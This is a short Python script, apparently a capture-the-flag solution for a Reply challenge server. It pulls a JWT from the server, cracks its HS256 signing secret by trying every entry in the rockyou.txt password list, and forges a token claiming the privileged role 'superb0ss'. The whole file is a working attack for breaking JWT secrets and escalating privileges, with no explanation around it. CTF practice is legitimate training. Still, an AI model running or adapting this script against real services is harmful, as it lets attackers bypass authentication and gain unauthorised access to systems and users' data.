import jwt
import requests

url = "http://gamebox1.reply.it/ba3eab423b1f3ff4df2b8da016084b61/"

s = requests.Session()

req = s.get(url + 'token')
jwt_code = req.headers['Authorization']

test = jwt.encode({"role": "superb0ss"}, "chicken", "HS256")
print(test)

with open("../common/rockyou.txt", encoding="latin-1") as handle:
    lines = [l.strip() for l in handle.readlines()]
    for secret_key in lines:
        try:
            test = jwt.decode(jwt_code, secret_key, ["HS256"], options={"verify_signature": True})
            print(secret_key)
        except:
            pass
